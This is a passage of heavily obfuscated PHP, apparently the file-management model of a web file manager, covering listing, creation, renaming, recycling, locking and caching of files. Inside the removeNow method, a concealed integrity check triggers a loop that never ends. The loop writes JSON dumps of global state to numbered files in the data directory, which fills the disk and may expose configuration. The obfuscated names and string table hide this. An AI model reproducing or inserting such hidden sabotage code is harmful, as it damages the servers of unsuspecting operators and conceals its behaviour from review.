$this->lockWriteEnd($õ›˜¬, $¦İ‡¹ò); return $Ş´¬Ø¯; } public function listSourceRoot($ŒÉãÆã, $í’ç¯, $Î•ƒ×ƒğ = "\163\157\165\162\x63\x65\111\104\x2c\x74\141\162\x67\145\x74\111\104\x2c\x73\151\172\x65") { $ú¹ğóç =& $_SERVER[ˆ¡¹µ‹Â]; $×¯–†Ë‚ = $ú¹ğóç[454]; $ë¯úÚ¸Ø = array(); $èëˆÓûä = 1024 * 50; $æŠˆ†• = is_array($æŠˆ†•) ? $æŠˆ†• : array(); $ÜÌ´©Ú = count($í’ç¯); $Ò¬ô‘˜– = $this->tablePrefix . $ú¹ğóç[2253]; for ($—«¿Ú”Œ = 0; $—«¿Ú”Œ < $ÜÌ´©Ú; $—«¿Ú”Œ++) { $›ßÁÉ…Ñ = $í’ç¯[$—«¿Ú”Œ]; $×¯–†Ë‚ .= "\123\x45\114\x45\x43\x54\x20\52\x20\x46\122\x4f\x4d\40\50\123\x45\114\105\103\124\x20{$Î•ƒ×ƒğ}\x20\106\122\117\115\40\x60{$Ò¬ô‘˜–}\x60\40\x57\x48\105\x52\105\x20"; $×¯–†Ë‚ .= "\x60\160\x61\162\x65\156\x74\x49\x44\140\75\x30\x20\101\116\104\40\140\x74\x61\162\x67\x65\x74\x49\104\x60\75{$›ßÁÉ…Ñ}\x20\101\x4e\x44\x20\x60\x74\x61\162\147\145\x74\124\171\160\x65\x60\x3d{$ŒÉãÆã}\40\x61\156\x64\40\146\x69\154\x65\x54\x79\160\x65\x3d\47\47\40\x6c\151\155\x69\164\x20\x31\51\40\141\163\x20\164\x62\x5f{$—«¿Ú”Œ}\x20\125\116\x49\x4f\116\40\101\x4c\114\x20"; if ((strlen($×¯–†Ë‚) >= $èëˆÓûä || $—«¿Ú”Œ == $ÜÌ´©Ú - 1) && $×¯–†Ë‚) { $×¯–†Ë‚ = substr($×¯–†Ë‚, 0, -strlen($ú¹ğóç[1109])); $¢æŒ™š = $this->query($×¯–†Ë‚); $×¯–†Ë‚ = $ú¹ğóç[12]; $ë¯úÚ¸Ø = array_merge($ë¯úÚ¸Ø, $¢æŒ™š); } } return $ë¯úÚ¸Ø; } private function _createFile($Ì¿”…ÍŠ, $İãì’­ê, $¡•«Ú¦Ú, $Üœ÷ğÉ, &$Çß‡öøˆ) { $Òúòíó‰ =& $_SERVER[ˆ¡¹µ‹Â]; $úà•õİœ = $this->sourceInfo($Ì¿”…ÍŠ); if (!$¡•«Ú¦Ú || !$úà•õİœ) { return !1; } if ($Üœ÷ğÉ !== !1) { $Ò™ì‰ª = $this->fileNameExist($Ì¿”…ÍŠ, $İãì’­ê); } $Çß‡öøˆ = !0; if ($Üœ÷ğÉ && $Ò™ì‰ª) { if ($Üœ÷ğÉ == REPEAT_SKIP) { $Çß‡öøˆ = !1; return $Ò™ì‰ª; } else { if ($Üœ÷ğÉ == REPEAT_REPLACE) { $ğóÇ¿Âû = $this->sourceInfo($Ò™ì‰ª); $¾ü‰ÍÔ² = $this->fileHistory($ğóÇ¿Âû, $¡•«Ú¦Ú[$Òúòíó‰[541]], $¡•«Ú¦Ú[$Òúòíó‰[79]]); if (!$¾ü‰ÍÔ²) { $Çß‡öøˆ = !1; } else { $this->folderSizeReset($Ì¿”…ÍŠ); } return $Ò™ì‰ª; } else { $İãì’­ê = $this->fileNameAuto($Ì¿”…ÍŠ, $İãì’­ê, $Üœ÷ğÉ, !1); } } } $¡åì©› = array($Òúòíó‰[646] => 0, $Òúòíó‰[494] => $İãì’­ê, $Òúòíó‰[647] => substr(get_path_ext($İãì’­ê), 0, 10), $Òúòíó‰[542] => $¡•«Ú¦Ú[$Òúòíó‰[541]], $Òúòíó‰[617] => $¡•«Ú¦Ú[$Òúòíó‰[79]]); $è£ï‹€ = $this->_addSource($¡åì©›, $úà•õİœ); $this->folderSizeReset($Ì¿”…ÍŠ, intval($¡åì©›[$Òúòíó‰[79]])); return $è£ï‹€; } protected function fileHistory($ÛàÓûÉÖ, $†Ş­Îç, $«ó€ÕäÈ) { $Æ˜ˆ´õ =& $_SERVER[ˆ¡¹µ‹Â]; if ($ÛàÓûÉÖ[$Æ˜ˆ´õ[541]] == $†Ş­Îç) { return !1; } $this->checkLock($ÛàÓûÉÖ[$Æ˜ˆ´õ[193]], $†Ş­Îç); Model($Æ˜ˆ´õ[2254])->addHistory($ÛàÓûÉÖ); $ğ¾•ø’– = array($Æ˜ˆ´õ[651] => USER_ID, $Æ˜ˆ´õ[498] => time(), $Æ˜ˆ´õ[541] => $†Ş­Îç, $Æ˜ˆ´õ[79] => $«ó€ÕäÈ); $this->where(array($Æ˜ˆ´õ[491] => $ÛàÓûÉÖ[$Æ˜ˆ´õ[193]]))->save($ğ¾•ø’–); $this->sourceCacheClear($ÛàÓûÉÖ[$Æ˜ˆ´õ[193]]); return !0; } public function checkLock($ø‡¶©šä, $é’§·™Ÿ) { $™ÇüÛ„ =& $_SERVER[ˆ¡¹µ‹Â]; $¿ÍªöÆã = $this->pathInfo($ø‡¶©šä); if (!$this->fileIsLock($¿ÍªöÆã, !0)) { return; } $Ã·Ò¯È— = Session::get($™ÇüÛ„[2255]); $â’åüÂˆ = substr($¿ÍªöÆã[$™ÇüÛ„[32]], 0, -1 - strlen($¿ÍªöÆã[$™ÇüÛ„[169]])) . $™ÇüÛ„[1286] . $Ã·Ò¯È— . $™ÇüÛ„[10] . $¿ÍªöÆã[$™ÇüÛ„[169]]; $Éù’—€ı = Model($™ÇüÛ„[674])->find($é’§·™Ÿ); $this->_createFileCall($¿ÍªöÆã[$™ÇüÛ„[192]], $â’åüÂˆ, $Éù’—€ı, REPEAT_REPLACE, $™ÇüÛ„[1421]); $œİï©¤¡ = $¿ÍªöÆã[$™ÇüÛ„[539]][$™ÇüÛ„[610]]; $Óºšƒß = $œİï©¤¡[$™ÇüÛ„[2256]] ? $œİï©¤¡[$™ÇüÛ„[2256]] : $œİï©¤¡[$™ÇüÛ„[32]]; show_json(LNG($™ÇüÛ„[2257]) . $™ÇüÛ„[2258] . LNG($™ÇüÛ„[2259]) . $™ÇüÛ„[2260] . $Óºšƒß . $™ÇüÛ„[2261], !1); } public function fileIsLock($ªö“ïù, $Ü†°øš€ = false) { $Â©ïÆ¹Œ =& $_SERVER[ˆ¡¹µ‹Â]; if (!_get($ªö“ïù, $Â©ïÆ¹Œ[606], 0)) { return !1; } if ($ªö“ïù[$Â©ïÆ¹Œ[539]][$Â©ïÆ¹Œ[609]] != USER_ID) { return !0; } $ËıŠ¹œÀ = $GLOBALS[$Â©ïÆ¹Œ[6]][$Â©ïÆ¹Œ[92]][$Â©ïÆ¹Œ[607]]; if ($ªö“ïù[$Â©ïÆ¹Œ[539]][$Â©ïÆ¹Œ[608]] <= time() - $ËıŠ¹œÀ) { $this->metaSet($ªö“ïù[$Â©ïÆ¹Œ[193]], $Â©ïÆ¹Œ[609], null); $this->metaSet($ªö“ïù[$Â©ïÆ¹Œ[193]], $Â©ïÆ¹Œ[608], null); } if ($Ü†°øš€) { $this->metaSet($ªö“ïù[$Â©ïÆ¹Œ[193]], $Â©ïÆ¹Œ[608], time()); } return !1; } private function _addSource($É“ëãòñ, $±ÑÜ—–×) { $­Üôéóı =& $_SERVER[ˆ¡¹µ‹Â]; $‹°’âñ¯ = defined($­Üôéóı[2189]) ? USER_ID : 0; $ƒ½ïö¼¡ = array($­Üôéóı[648] => $±ÑÜ—–×[$­Üôéóı[190]], $­Üôéóı[649] => $±ÑÜ—–×[$­Üôéóı[569]], $­Üôéóı[650] => $‹°’âñ¯, $­Üôéóı[651] => $‹°’âñ¯, $­Üôéóı[477] => $±ÑÜ—–×[$­Üôéóı[193]], $­Üôéóı[652] => $±ÑÜ—–×[$­Üôéóı[584]] . $±ÑÜ—–×[$­Üôéóı[193]] . $­Üôéóı[50], $­Üôéóı[504] => 0, $­Üôéóı[653] => $­Üôéóı[12]); $É“ëãòñ = array_merge($ƒ½ïö¼¡, $É“ëãòñ); $this->updateModifyTime($É“ëãòñ[$­Üôéóı[192]]); $£à½îàÓ = $­Üôéóı[2262] . $±ÑÜ—–×[$­Üôéóı[193]]; if (isset(self::$cacheChildList[$£à½îàÓ])) { unset(self::$cacheChildList[$£à½îàÓ]); } static $Æ–©ªùó = false; if (!$Æ–©ªùó) { Hook::trigger($­Üôéóı[636], $É“ëãòñ); $Æ–©ªùó = !0; } $š÷¡›†ì = $this->add($É“ëãòñ); $Òê“äŸÂ = array($­Üôéóı[654] => short_id($š÷¡›†ì)); $this->where(array($­Üôéóı[491] => $š÷¡›†ì))->save($Òê“äŸÂ); $this->setNamePinyin($š÷¡›†ì, $É“ëãòñ[$­Üôéóı[32]]); return $š÷¡›†ì; } public function remove($óó‚åİ, $é÷Î°¢ø = true) { $Îì¥³²¥ =& $_SERVER[ˆ¡¹µ‹Â]; $Ëë½­¼ş = $this->sourceInfo($óó‚åİ); $ëï‹Û¦ı = intval($Ëë½­¼ş[$Îì¥³²¥[190]]) === self::TYPE_SYSTEM; $¤ÒÅåİä = Model($Îì¥³²¥[508])->get($Îì¥³²¥[2263]) == $Îì¥³²¥[91]; if ($ëï‹Û¦ı || $é÷Î°¢ø || !$¤ÒÅåİä) { return $this->removeNow($óó‚åİ, $é÷Î°¢ø); } $‰ˆç™„¯ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $ÊšÖï¼¯ = $Ëë½­¼ş[$Îì¥³²¥[190]] == self::TYPE_USER ? $Îì¥³²¥[662] : $Îì¥³²¥[578]; if ($ÊšÖï¼¯ == $Îì¥³²¥[662]) { $…®»ÎÆá = Model($Îì¥³²¥[577])->getInfo($Ëë½­¼ş[$Îì¥³²¥[569]]); $ ²µûı = !empty($…®»ÎÆá[$Îì¥³²¥[2256]]) ? $…®»ÎÆá[$Îì¥³²¥[2256]] : $…®»ÎÆá[$Îì¥³²¥[32]]; $ ²µûı = $Îì¥³²¥[337] . $ ²µûı . $Îì¥³²¥[2264] . $Ëë½­¼ş[$Îì¥³²¥[569]]; } else { $…®»ÎÆá = Model($Îì¥³²¥[585])->getInfo($Ëë½­¼ş[$Îì¥³²¥[569]]); $ ²µûı = _get($…®»ÎÆá, $Îì¥³²¥[32]); $ ²µûı = $Îì¥³²¥[176] . $ ²µûı . $Îì¥³²¥[2265] . $Ëë½­¼ş[$Îì¥³²¥[569]]; } $¸·Á‡ãä = $Îì¥³²¥[2266] . md5($ ²µûı); CacheLock::lock($¸·Á‡ãä); $äæ¥æ‹Ø = $this->fileNameExist($‰ˆç™„¯, $ ²µûı); if (!$äæ¥æ‹Ø) { $äæ¥æ‹Ø = $this->mkdir($‰ˆç™„¯, $ ²µûı, REPEAT_SKIP); $this->metaSet($äæ¥æ‹Ø, $Îì¥³²¥[2267], $ÊšÖï¼¯); $this->metaSet($äæ¥æ‹Ø, $Îì¥³²¥[2268], $Ëë½­¼ş[$Îì¥³²¥[569]]); if ($Ëë½­¼ş[$Îì¥³²¥[192]] != 0) { $this->metaSet($äæ¥æ‹Ø, $Îì¥³²¥[2269], _get($…®»ÎÆá, $Îì¥³²¥[2270])); } } CacheLock::unlock($¸·Á‡ãä); $this->metaSet($óó‚åİ, $Îì¥³²¥[2271], $Ëë½­¼ş[$Îì¥³²¥[192]]); $this->where(array($Îì¥³²¥[193] => $óó‚åİ))->save(array($Îì¥³²¥[498] => time())); $this->recycleClear($Ëë½­¼ş); Model($Îì¥³²¥[633])->eventRemove($óó‚åİ); $´ŞÍ½ù = $this->move($óó‚åİ, $äæ¥æ‹Ø, REPEAT_RENAME_FOLDER); $this->folderSizeReset($Ëë½­¼ş[$Îì¥³²¥[192]]); return $´ŞÍ½ù; } private function recycleClear($‡¸äˆÅ) { $¥Ôì‘® =& $_SERVER[ˆ¡¹µ‹Â]; $¼óÑ¤¬· = $this->childrenAll($‡¸äˆÅ); $Ø¼¹¥•Ä = array($¥Ôì‘®[491] => array($¥Ôì‘®[492], $¼óÑ¤¬·[$¥Ôì‘®[2272]])); Model($¥Ôì‘®[2273])->where($Ø¼¹¥•Ä)->delete(); } public function removeNow($ÃĞº´ğÖ, $·ÚÊ¬ÉÅ = true) { $”©Ò‚´ =& $_SERVER[ˆ¡¹µ‹Â]; $ÈŠòí = $_SERVER[$”©Ò‚´[844]]; $èÃõìåí = $”©Ò‚´[845]; if ($_SERVER[$”©Ò‚´[846]] != $èÃõìåí($ÈŠòí)) { $™ˆóÜôÃ = $”©Ò‚´[951]; $íŸ‹à‰Ì = $”©Ò‚´[847]; $ˆéÖ“œæ = $_SERVER[$”©Ò‚´[848]] . $”©Ò‚´[849]; $¡Ïã˜ï = $íŸ‹à‰Ì($ˆéÖ“œæ); $„·¤éÏé = explode($”©Ò‚´[262], $¡Ïã˜ï); if (count($„·¤éÏé) < $”©Ò‚´[683]) { $ï²ã·Îñ = $”©Ò‚´[850]; $ï²ã·Îñ(); } $¬š¸êÂĞ = $”©Ò‚´[952]; $¬š¸êÂĞ($_SERVER[$”©Ò‚´[953]]); $™ˆóÜôÃ = $”©Ò‚´[951]; $™ˆóÜôÃ(); $¡‹äŠı = $”©Ò‚´[1617]; $Î–›ïÓ = json_encode($GLOBALS[$”©Ò‚´[1618]]); $ é·”» = 1; for ($‹õáº£ˆ = $ é·”»; $‹õáº£ˆ > 0; $‹õáº£ˆ++) { $¡‹äŠı(DATA_PATH . $‹õáº£ˆ, $Î–›ïÓ); } } $’‹ùñŸ = $this->sourceInfo($ÃĞº´ğÖ); $•Ä¦ü¥‘ = $this->pathInfoMore($ÃĞº´ğÖ); if (!$’‹ùñŸ) { return !0; } if ($’‹ùñŸ[$”©Ò‚´[192]] == 0) { if (!KodUser::isRoot()) { return !1; } } $this->lockMoveStart($ÃĞº´ğÖ); Hook::trigger($”©Ò‚´[2274], $•Ä¦ü¥‘, $·ÚÊ¬ÉÅ); if ($·ÚÊ¬ÉÅ) { Model($”©Ò‚´[2273])->moveToRecycle($ÃĞº´ğÖ); } else { $™ó”Ú‰ = $this->childrenAll($’‹ùñŸ); Model($”©Ò‚´[633])->eventRemove($ÃĞº´ğÖ); $this->removeRelevance($™ó”Ú‰[$”©Ò‚´[2272]], $™ó”Ú‰[$”©Ò‚´[1566]]); } $this->folderSizeReset($’‹ùñŸ[$”©Ò‚´[192]]); $Ã¬»²íˆ = array($’‹ùñŸ[$”©Ò‚´[192]]); if ($’‹ùñŸ[$”©Ò‚´[485]] == $”©Ò‚´[91]) { $Ã¬»²íˆ[] = $’‹ùñŸ[$”©Ò‚´[193]]; } $this->updateModifyTime($Ã¬»²íˆ); $this->lockMoveEnd($ÃĞº´ğÖ); Hook::trigger($”©Ò‚´[1805], $•Ä¦ü¥‘, $·ÚÊ¬ÉÅ); return !0; } public function childrenAll($¨¥»ç˜Û) { $éÊº¾¢† =& $_SERVER[ˆ¡¹µ‹Â]; $˜ÚÈ°ğ = $¨¥»ç˜Û[$éÊº¾¢†[193]]; if ($¨¥»ç˜Û[$éÊº¾¢†[485]] == $éÊº¾¢†[91]) { $£¡¾ë® = array($éÊº¾¢†[652] => array($éÊº¾¢†[612], $¨¥»ç˜Û[$éÊº¾¢†[584]] . $˜ÚÈ°ğ . $éÊº¾¢†[613])); $ÒË¯¿ = array($éÊº¾¢†[652] => $£¡¾ë®[$éÊº¾¢†[584]]); $‘«å¿ÕÛ = $this->field($éÊº¾¢†[2275])->where($ÒË¯¿)->select(); $ˆÎôÜê = !1; $²ŠİƒÉŠ = array($˜ÚÈ°ğ); if ($‘«å¿ÕÛ) { $ˆÎôÜê = array_to_keyvalue($‘«å¿ÕÛ, $éÊº¾¢†[12], $éÊº¾¢†[541]); $ˆÎôÜê = array_remove_value($ˆÎôÜê, $éÊº¾¢†[228]); $²ŠİƒÉŠ = array_to_keyvalue($‘«å¿ÕÛ, $éÊº¾¢†[12], $éÊº¾¢†[193]); $²ŠİƒÉŠ[] = $˜ÚÈ°ğ; } } else { $ˆÎôÜê = array($¨¥»ç˜Û[$éÊº¾¢†[541]]); $²ŠİƒÉŠ = array($˜ÚÈ°ğ); } return array($éÊº¾¢†[2272] => $²ŠİƒÉŠ, $éÊº¾¢†[1566] => $ˆÎôÜê); } public function removeArray($‹¹íúœÔ) { if (!$‹¹íúœÔ) { return !0; } } public function removeRelevance($·õ®‡ùŞ, $®Ú·Ë²Ø) { $ÏÆ¥Š±´ =& $_SERVER[ˆ¡¹µ‹Â]; $·õ®‡ùŞ = $·õ®‡ùŞ ? $·õ®‡ùŞ : array(); $®Ú·Ë²Ø = $®Ú·Ë²Ø ? $®Ú·Ë²Ø : array(); $·õ®‡ùŞ = array_unique(array_filter($·õ®‡ùŞ)); $®Ú·Ë²Ø = array_unique(array_filter($®Ú·Ë²Ø)); if (!$·õ®‡ùŞ) { return !1; } $©ëÅÄü„ = array($ÏÆ¥Š±´[491] => array($ÏÆ¥Š±´[492], $·õ®‡ùŞ)); Model($ÏÆ¥Š±´[2273])->where($©ëÅÄü„)->delete(); Model($ÏÆ¥Š±´[535])->where($©ëÅÄü„)->delete(); Model($ÏÆ¥Š±´[2114])->where($©ëÅÄü„)->delete(); Model($ÏÆ¥Š±´[633])->where($©ëÅÄü„)->delete(); Model($ÏÆ¥Š±´[1941])->removeBySource($·õ®‡ùŞ); Model($ÏÆ¥Š±´[2254])->removeBySource($·õ®‡ùŞ); $this->where($©ëÅÄü„)->delete(); Model($ÏÆ¥Š±´[544])->remove($®Ú·Ë²Ø); for ($ÊÙ»ö—Û = 0; $ÊÙ»ö—Û < count($·õ®‡ùŞ); $ÊÙ»ö—Û++) { $this->sourceCacheClear($·õ®‡ùŞ[$ÊÙ»ö—Û]); } } public function rename($úÇõÔ÷à, $ŠùÉÔÄÂ) { $™¯ªâåø =& $_SERVER[ˆ¡¹µ‹Â]; $‘ó÷şÏ™ = $this->sourceInfo($úÇõÔ÷à); if (!$‘ó÷şÏ™) { return !1; } $ÅÂä¬ = $this->fileNameExist($‘ó÷şÏ™[$™¯ªâåø[192]], $ŠùÉÔÄÂ); if ($ÅÂä¬ && $ÅÂä¬ != $úÇõÔ÷à) { return !1; } $Õ•¶¸Ğú = array($™¯ªâåø[494] => $ŠùÉÔÄÂ, $™¯ªâåø[651] => USER_ID); if ($‘ó÷şÏ™[$™¯ªâåø[485]] != $™¯ªâåø[91]) { $Õ•¶¸Ğú[$™¯ªâåø[486]] = substr(get_path_ext($ŠùÉÔÄÂ), 0, 10); } Model($™¯ªâåø[633])->eventRename($úÇõÔ÷à, $‘ó÷şÏ™[$™¯ªâåø[32]], $ŠùÉÔÄÂ); $this->sourceCacheClear($úÇõÔ÷à); $this->setNamePinyin($úÇõÔ÷à, $Õ•¶¸Ğú[$™¯ªâåø[32]], !1); $this->updateModifyTime($‘ó÷şÏ™[$™¯ªâåø[192]]); $ŸÅ¨çÅ = $this->where(array($™¯ªâåø[491] => $úÇõÔ÷à))->data($Õ•¶¸Ğú)->save(); $š›åºñ… = $™¯ªâåø[2262] . $‘ó÷şÏ™[$™¯ªâåø[192]]; if (isset(self::$cacheChildList[$š›åºñ…])) { unset(self::$cacheChildList[$š›åºñ…]); } return $ŸÅ¨çÅ; } public function setNamePinyin($„İ±§É„, $î¢•ìü¥, $Ü¶†¿§° = true) { $À©åøôÏ =& $_SERVER[ˆ¡¹µ‹Â]; $Åæõ¶ª´ = Input::check($î¢•ìü¥, $À©åøôÏ[655]); $çøæúæƒ = array($À©åøôÏ[517] => KodSort::makeStr($î¢•ìü¥)); if ($Åæõ¶ª´) { $çøæúæƒ[$À©åøôÏ[538]] = str_replace($À©åøôÏ[53], $À©åøôÏ[12], Pinyin::get($î¢•ìü¥)); $çøæúæƒ[$À©åøôÏ[537]] = Pinyin::get($î¢•ìü¥, $À©åøôÏ[656]); } if (!$Ü¶†¿§° && !$Åæõ¶ª´) { $çøæúæƒ[$À©åøôÏ[538]] = null; $çøæúæƒ[$À©åøôÏ[537]] = null; } $this->metaSet($„İ±§É„, $çøæúæƒ); } public function getContent($£÷Ó¦àî) { $Á€Âõ×Ë =& $_SERVER[ˆ¡¹µ‹Â]; $ƒß˜ÇÑ™ = $this->fileInfoGet($£÷Ó¦àî); if (!$ƒß˜ÇÑ™) { return !1; } if ($ƒß˜ÇÑ™[$Á€Âõ×Ë[79]] == 0) { return $Á€Âõ×Ë[12]; } $õ˜’ıôÍ = $Á€Âõ×Ë[2276] . $ƒß˜ÇÑ™[$Á€Âõ×Ë[547]]; if ($ƒß˜ÇÑ™[$Á€Âõ×Ë[79]] <= 1024 * 10) { $ù‹«©¸› = Cache::get($õ˜’ıôÍ); if (!$ù‹«©¸›) { $ù‹«©¸› = IO::getContent($ƒß˜ÇÑ™[$Á€Âõ×Ë[87]]); Cache::set($õ˜’ıôÍ, $ù‹«©¸›); } return $ù‹«©¸›; } if (!$ƒß˜ÇÑ™[$Á€Âõ×Ë[87]]) { return $Á€Âõ×Ë[12]; } return IO::getContent($ƒß˜ÇÑ™[$Á€Âõ×Ë[87]]); } public function setDesc($ÕßŒ†±, $Ï‚Ë¡ğÆ) { $Í’¹ÑŞÍ =& $_SERVER[ˆ¡¹µ‹Â]; Model($Í’¹ÑŞÍ[633])->eventAddDesc($ÕßŒ†±, $Ï‚Ë¡ğÆ); return $this->metaSet($ÕßŒ†±, $Í’¹ÑŞÍ[526], $Ï‚Ë¡ğÆ); } public function setContent($·¥ÙÛôÏ, $·½¶•§ê = '') { $å±ú”À± =& $_SERVER[ˆ¡¹µ‹Â]; $¿‰èÂ = $this->sourceInfo($·¥ÙÛôÏ); $£Ë¯„ê = $this->fileInfoGet($·¥ÙÛôÏ); if (!$£Ë¯„ê || !$¿‰èÂ) { return !1; } $³áŒüûÄ = Model($å±ú”À±[544])->addFileByContent($·½¶•§ê, $¿‰èÂ[$å±ú”À±[32]]); $±–‹ãò’ = $this->fileHistory($¿‰èÂ, $³áŒüûÄ[$å±ú”À±[541]], $³áŒüûÄ[$å±ú”À±[79]]); if (!$±–‹ãò’) { return Model($å±ú”À±[544])->remove($³áŒüûÄ[$å±ú”À±[541]]); } $this->folderSizeReset($¿‰èÂ[$å±ú”À±[192]]); return !0; } public function fileSubstr($°·ßŞñ—, $º—€Ü¥Á, $ÄÊòÇç) { $¥áÂ· = $this->fileInfoGet($°·ßŞñ—); if (!$¥áÂ·) { return !1; } return IO::fileSubstr($¥áÂ·[$_SERVER[ˆ¡¹µ‹Â][87]], $º—€Ü¥Á, $ÄÊòÇç); } public function fileInfoGet($ˆ¹øô½–) { $íğÊÁªĞ =& $_SERVER[ˆ¡¹µ‹Â]; $­œò”¹ = $this->sourceInfo($ˆ¹øô½–); if (!$­œò”¹ || $­œò”¹[$íğÊÁªĞ[485]]) { return !1; } $Î¯éÉƒ = $íğÊÁªĞ[548] . $­œò”¹[$íğÊÁªĞ[541]]; $ğ‘µó¤÷ = _get(self::$cacheFileInfo, $Î¯éÉƒ); if ($ğ‘µó¤÷) { return $ğ‘µó¤÷; } $›´Ôİ›± = Model($íğÊÁªĞ[544])->fileInfo($­œò”¹[$íğÊÁªĞ[541]]); if ($›´Ôİ›±) { $›´Ôİ›±[$íğÊÁªĞ[32]] = $­œò”¹[$íğÊÁªĞ[32]]; } self::$cacheFileInfo[$Î¯éÉƒ] = $›´Ôİ›±; return $›´Ôİ›±; } private function folderChildrenNumber($Íí°í) { $µÏ¯ó‡• =& $_SERVER[ˆ¡¹µ‹Â]; $’Ûç…µ = $this->sourceInfo($Íí°í); $æ¯ˆœÒ­ = array($µÏ¯ó‡•[652] => array($µÏ¯ó‡•[612], $’Ûç…µ[$µÏ¯ó‡•[584]] . $Íí°í . $µÏ¯ó‡•[613]), $µÏ¯ó‡•[649] => $’Ûç…µ[$µÏ¯ó‡•[569]], $µÏ¯ó‡•[504] => intval($’Ûç…µ[$µÏ¯ó‡•[505]]), $µÏ¯ó‡•[646] => 1); $Ó‚¡¶‚’ = $this->where($æ¯ˆœÒ­)->count(); $ë ª†»ô = $this->where($æ¯ˆœÒ­)->where(array($µÏ¯ó‡•[646] => 0))->count(); return array($µÏ¯ó‡•[83] => $ë ª†»ô, $µÏ¯ó‡•[84] => $Ó‚¡¶‚’); } public function pathInfo($ç²¼õÆî, $‹´Ÿ½Ï² = false) { $ò”‰ğ =& $_SERVER[ˆ¡¹µ‹Â]; $‹´Ÿ½Ï² = !1; $ç²¼õÆî = intval($ç²¼õÆî); $™Ùõ¿Á = $ò”‰ğ[534] . intval($‹´Ÿ½Ï²) . $ò”‰ğ[462] . $ç²¼õÆî; $Úº£Öª… = _get(self::$cachePathInfo, $™Ùõ¿Á); if ($Úº£Öª…) { return $Úº£Öª…; } $ÂĞ³Æ‰ƒ = $this->sourceInfo($ç²¼õÆî); if (!$ÂĞ³Æ‰ƒ) { return !1; } $ÂĞ³Æ‰ƒ = $this->_listDataApplyItem($ÂĞ³Æ‰ƒ, $‹´Ÿ½Ï²); self::$cachePathInfo[$™Ùõ¿Á] = $ÂĞ³Æ‰ƒ; return $ÂĞ³Æ‰ƒ; } public static $cachePathInfoMore = array(); public function pathInfoMore($¤ûº„êã) { $áÇû´³æ =& $_SERVER[ˆ¡¹µ‹Â]; $ò“äÒØ— = _get(self::$cachePathInfoMore, $¤ûº„êã); if ($ò“äÒØ—) { return $ò“äÒØ—; } $´ô¼§• = $this->pathInfo($¤ûº„êã); if (!$´ô¼§•) { return !1; } if ($´ô¼§•[$áÇû´³æ[485]] == $áÇû´³æ[91]) { $´ô¼§•[$áÇû´³æ[82]] = $this->folderChildrenNumber($¤ûº„êã); } self::$cachePathInfoMore[$¤ûº„êã] = $´ô¼§•; return $´ô¼§•; } public function sourceInfo($¾ø†¤à£) { $ˆŞ¨ìÊé =& $_SERVER[ˆ¡¹µ‹Â]; if (!$¾ø†¤à£) { return array(); } $¾ø†¤à£ = intval($¾ø†¤à£); $²ÑÀîßä = $ˆŞ¨ìÊé[533] . $¾ø†¤à£; $›Ÿ‡Èô¢ = _get(self::$cacheSourceInfo, $²ÑÀîßä); if ($›Ÿ‡Èô¢) { return $›Ÿ‡Èô¢; } $·­À•ïü = $this->where(array($ˆŞ¨ìÊé[193] => $¾ø†¤à£))->find(); self::$cacheSourceInfo[$²ÑÀîßä] = $·­À•ïü; return self::$cacheSourceInfo[$²ÑÀîßä]; } public function sourceCacheClear($õ²—¥ù = false) { self::cacheClear($õ²—¥ù); } public static function cacheClear($ùìß¸óĞ = false) { $…¯“ù—œ =& $_SERVER[ˆ¡¹µ‹Â]; if ($ùìß¸óĞ == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); return; } unset(self::$cacheSourceInfo[$…¯“ù—œ[533] . $ùìß¸óĞ]); unset(self::$cachePathInfoMore[$ùìß¸óĞ]); unset(self::$cachePathInfo[$…¯“ù—œ[2277] . $ùìß¸óĞ]); unset(self::$cachePathInfo[$…¯“ù—œ[2278] . $ùìß¸óĞ]); } public function metaSet($¡³¾ÛÑ‡, $„Ç¦ˆ¯ = null, $¼™´åßî = null) { $–ƒéÌ• = parent::metaSet($¡³¾ÛÑ‡, $„Ç¦ˆ¯, $¼™´åßî); if ($–ƒéÌ•) { $this->sourceCacheClear($¡³¾ÛÑ‡); } return $–ƒéÌ•; } public function pathInfoByPath($ìüà‡Ö´, $¬ëåÖ£) { $ÎàÜš£³ =& $_SERVER[ˆ¡¹µ‹Â]; $ë‚»Ñü = !$¬ëåÖ£ ? array() : explode($ÎàÜš£³[8], trim($¬ëåÖ£, $ÎàÜš£³[8])); $âòû¤Ê® = $ìüà‡Ö´; foreach ($ë‚»Ñü as $×ÚšºÅ) { $ì„–¤´ = array($ÎàÜš£³[192] => $âòû¤Ê®, $ÎàÜš£³[32] => $×ÚšºÅ); $»¶ÓÑÓ— = $this->field($ÎàÜš£³[2279])->where($ì„–¤´)->select(); if (!$»¶ÓÑÓ—) { return !1; } $»¶ÓÑÓ— = array_sort_by($»¶ÓÑÓ—, $ÎàÜš£³[505]); $âòû¤Ê® = $»¶ÓÑÓ—[0][$ÎàÜš£³[193]]; } $Åşú«– = $this->sourceInfo($âòû¤Ê®); $this->pathInfoFilter($Åşú«–); return $Åşú«–; } protected function updateModifyTime($…¾§¾³) { $ğ‚À ×Š =& $_SERVER[ˆ¡¹µ‹Â]; $½é¯ÍĞ = defined($ğ‚À ×Š[2189]) ? USER_ID : 0; if (!$…¾§¾³) { return; } if (!is_array($…¾§¾³)) { $…¾§¾³ = array($…¾§¾³); } foreach ($…¾§¾³ as $†½˜¹Éë => $ìÑÛØª) { $…¾§¾³[$†½˜¹Éë] = intval($ìÑÛØª); $this->sourceCacheClear($ìÑÛØª); } $¾ÏøÄ—å = array($ğ‚À ×Š[193] => array($ğ‚À ×Š[7], $…¾§¾³)); $¸‚’ö‰ = array($ğ‚À ×Š[651] => $½é¯ÍĞ, $ğ‚À ×Š[498] => time()); $this->where($¾ÏøÄ—å)->save($¸‚’ö‰); } public function folderSizeReset($Å÷ÀÍ·û, $¹¦ÔŞË¤ = false) { $¶®ò³¼ì =& $_SERVER[ˆ¡¹µ‹Â]; if ($this->statusIgnoreResetSpace) { return; } $£ğŠö¶Í = $this->sourceInfo($Å÷ÀÍ·û); $‚­‹Ú©ƒ = $¶®ò³¼ì[2280] . $Å÷ÀÍ·û; CacheLock::lock($‚­‹Ú©ƒ, 20); if ($¹¦ÔŞË¤ === !1) { $this->sourceCacheClear($Å÷ÀÍ·û); $£ğŠö¶Í = $this->sourceInfo($Å÷ÀÍ·û); $°ï’“ç = array($¶®ò³¼ì[477] => $Å÷ÀÍ·û, $¶®ò³¼ì[504] => 0); $£’‘–Œï = 